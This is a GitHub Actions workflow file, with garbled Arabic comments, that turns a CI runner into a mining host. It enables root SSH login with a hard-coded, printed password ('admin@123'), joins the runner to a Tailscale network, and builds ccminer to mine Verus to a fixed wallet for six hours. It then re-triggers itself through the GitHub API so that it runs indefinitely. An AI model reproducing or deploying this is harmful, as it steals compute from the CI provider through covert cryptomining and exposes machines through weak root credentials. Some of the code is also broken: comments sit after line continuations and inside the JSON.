name: VPS4
on:
  workflow_dispatch:

jobs:
  secure-vps:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Install & Configure SSH
        run: |
          sudo apt update -y
          sudo apt install -y openssh-server git build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev screen
          sudo systemctl enable ssh
          sudo systemctl start ssh
          echo "root:admin@123" | sudo chpasswd
          echo "PermitRootLogin yes" | sudo tee -a /etc/ssh/sshd_config
          sudo service ssh restart
          echo "âœ… SSH user: root | pass: admin@123"

      - name: Install Tailscale
        run: |  # ØªÙ… Ø§Ù„ØªØµØ­ÙŠØ­: Ø§Ø³ØªØ¨Ø¯Ø§Ù„ [] Ø¨Ù€ |
          curl -fsSL https://tailscale.com/install.sh | sh  # ØªÙ… Ø§Ù„ØªØµØ­ÙŠØ­: -fsSL Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† -fssl
          sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=vps-${{ github.run_id }}  # ØªÙ… Ø§Ù„ØªØµØ­ÙŠØ­: Ø¥ÙƒÙ…Ø§Ù„ --hostname ÙˆØ¥ØµÙ„Ø§Ø­ Ø§Ø³Ù… Ø§Ù„Ø³ÙØ±
          tsIP=$(tailscale ip -4 | head -n 1)  # ØªÙ… Ø§Ù„ØªØµØ­ÙŠØ­: ip (ØµØºÙŠØ±Ø©) Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† IP
          echo "TAILSCALE_IP=$tsIP" >> $GITHUB_ENV
          echo "âœ… Tailscale IP: $tsIP"

      - name: Verify SSH Access
        run: |  # ØªÙ… Ø§Ù„ØªØµØ­ÙŠØ­: Ø§Ø³ØªØ¨Ø¯Ø§Ù„ [] Ø¨Ù€ |
          echo "Tailscale VPS ready!"
          echo "IP: $TAILSCALE_IP"
          echo "User: root"
          echo "Pass: admin@123"

      - name: Install ccminer & Start Mining  # ØªÙ… Ø§Ù„ØªØµØ­ÙŠØ­: ccminer Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† _coniner
        run: |  # ØªÙ… Ø§Ù„ØªØµØ­ÙŠØ­: Ø§Ø³ØªØ¨Ø¯Ø§Ù„ [] Ø¨Ù€ |
          #!/bin/bash
          WALLET="RGBbQeM9cy64ImJfpW7WKZSYpmSUHMxf2p"  # Ù…ØªØºÙŠØ± Ù…Ø¹Ø¯Ù„ Ù„Ù„ÙˆØ¶ÙˆØ­ (Ø§Ø®ØªÙŠØ§Ø±ÙŠ)
          POOL="pool.verus.io:9998"
          THREADS=4  # Ù…ØªØºÙŠØ± Ù…Ø¹Ø¯Ù„ Ù„Ù„ÙˆØ¶ÙˆØ­ (Ø§Ø®ØªÙŠØ§Ø±ÙŠ)

          # Ø¥Ù†Ø´Ø§Ø¡ Ø§Ø³Ù… Ø¹Ø§Ù…Ù„ Ø¹Ø´ÙˆØ§Ø¦ÙŠ
          RAND_NUM=$(shuf -i 1000-9999 -n 1)
          RAND_CHARS=$(tr -dc 'a-zA-Z' < /dev/urandom | head -c 2)  # ØªÙ… Ø§Ù„ØªØµØ­ÙŠØ­: Ø§Ù„Ø·Ø±ÙŠÙ‚Ø© Ø§Ù„Ø£ÙƒØ«Ø± ÙØ¹Ø§Ù„ÙŠØ© ÙˆÙ…ÙˆØ«ÙˆÙ‚ÙŠØ©
          WORKER_NAME="ubuntu${RAND_NUM}${RAND_CHARS}"  # Ù…ØªØºÙŠØ± Ù…Ø¹Ø¯Ù„ Ù„Ù„ÙˆØ¶ÙˆØ­
          echo "ðŸ‘· Worker Name: $WORKER_NAME"

          # Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø¥Ù„Ù‰ Ø§Ù„Ø¯Ù„ÙŠÙ„ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ Ø¨Ø´ÙƒÙ„ ØµØ­ÙŠØ­
          cd $HOME || exit 1

          # ØªØ«Ø¨ÙŠØª Ø§Ù„ØªØ¨Ø¹ÙŠØ§Øª Ø¥Ø°Ø§ Ù„Ø²Ù… Ø§Ù„Ø£Ù…Ø± (Ø¥Ø¶Ø§ÙØ© Ù…ÙˆØµÙ‰ Ø¨Ù‡Ø§)
          sudo apt install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev

          if [ ! -d "$HOME/ccminer" ]; then  # ØªÙ… Ø§Ù„ØªØµØ­ÙŠØ­: ccminer Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† coniner
            git clone https://github.com/Oink70/ccminer-verus.git ccminer  # ØªÙ… Ø§Ù„ØªØµØ­ÙŠØ­: ccminer
            cd ccminer
            # ØªØ£ÙƒØ¯ Ù…Ù† Ø£Ù† build.sh Ù‚Ø§Ø¨Ù„ Ù„Ù„ØªÙ†ÙÙŠØ° Ø£Ùˆ Ø§Ø³ØªØ®Ø¯Ù… make
            chmod +x build.sh
            ./build.sh
          else
            cd ccminer  # ØªÙ… Ø§Ù„ØªØµØ­ÙŠØ­: ccminer
            make clean
            ./build.sh
          fi

          # Ø¥Ù†Ø´Ø§Ø¡ Ù…Ù„Ù Ø§Ù„ØªÙƒÙˆÙŠÙ†
          cat > config.json <<EOF
{
  "pools": [
    { 
      "name": "CUSTOM", 
      "url": "stratum+tcp://${POOL}",  # ØªÙ… Ø§Ù„ØªØµØ­ÙŠØ­: +tcp Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† =tcp
      "timeout": 180, 
      "disabled": 0 
    }
  ],
  "user": "${WALLET}.${WORKER_NAME}",  # ØªÙ… Ø§Ù„ØªØµØ­ÙŠØ­: Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø£Ù‚ÙˆØ§Ø³ Ø§Ù„Ù…Ø¹Ù‚ÙˆÙØ© {}
  "pass": "x",
  "algo": "verus",
  "threads": ${THREADS},
  "api-bind": "127.0.0.1:4068"
}
EOF

          # Ø¨Ø¯Ø¡ Ø§Ù„ØªØ¹Ø¯ÙŠÙ† ÙÙŠ Ø¬Ù„Ø³Ø© screen
          screen -dmS verus_mining ./ccminer -c config.json  # ØªÙ… Ø§Ù„ØªØµØ­ÙŠØ­: ccminer Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† coninerØŒ Ùˆ -dmS
          echo "ðŸš€ Ø§Ù„ØªØ¹Ø¯ÙŠÙ† Ø¨Ø¯Ø£ Worker: ${WORKER_NAME}"  # ØªÙ… Ø§Ù„ØªØµØ­ÙŠØ­: Ø±Ø³Ø§Ù„Ø© ÙˆØ§Ø¶Ø­Ø©
          echo "â–¶ï¸ Ù„Ù„Ø¹ÙˆØ¯Ø© Ø¥Ù„Ù‰ Ø¬Ù„Ø³Ø© Ø§Ù„ØªØ¹Ø¯ÙŠÙ†: screen -r verus_mining"  # ØªÙ… Ø§Ù„ØªØµØ­ÙŠØ­: Ø±Ø³Ø§Ù„Ø© ÙˆØ§Ø¶Ø­Ø©

      - name: Run VPS for 6 hours
        run: |  # ØªÙ… Ø§Ù„ØªØµØ­ÙŠØ­: Ø§Ø³ØªØ¨Ø¯Ø§Ù„ [] Ø¨Ù€ |
          echo "â³ VPS running for 6 hours..."
          sleep 21600   # 6 Ø³Ø§Ø¹Ø§Øª

      - name: Restart This Workflow
        env:
          REPO: ${{ github.repository }}  # ØªÙ… Ø§Ù„ØªØµØ­ÙŠØ­: Ø¥Ø²Ø§Ù„Ø© Ø§Ù„Ù‚ÙˆØ³ Ø§Ù„Ø¥Ø¶Ø§ÙÙŠ )
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |  # ØªÙ… Ø§Ù„ØªØµØ­ÙŠØ­: Ø§Ø³ØªØ¨Ø¯Ø§Ù„ [] Ø¨Ù€ |
          echo "ðŸ”„ Restarting workflow..."
          # Ø¨Ù†Ø§Ø¡ URL API Ø¨Ø´ÙƒÙ„ ØµØ­ÙŠØ­ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù…ØªØºÙŠØ±Ø§Øª GitHub
          curl -s -X POST \
            -H "Accept: application/vnd.github.v3+json" \  # ØªÙ… Ø§Ù„ØªØµØ­ÙŠØ­: vnd.github.v3+json
            -H "Authorization: Bearer $GITHUB_TOKEN" \
            "https://api.github.com/repos/$REPO/actions/workflows/vps4.yml/dispatches" \  # ØªÙ… Ø§Ù„ØªØµØ­ÙŠØ­: URL ÙƒØ§Ù…Ù„ ÙˆØ¯Ù‚ÙŠÙ‚
            -d '{"ref":"main"}'  # ØªÙ… Ø§Ù„ØªØµØ­ÙŠØ­: Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø§Ù‚ØªØ¨Ø§Ø³ Ø§Ù„Ù…ÙØ±Ø¯ Ø­ÙˆÙ„ JSON
          echo "âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø£Ù…Ø± Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªØ´ØºÙŠÙ„"
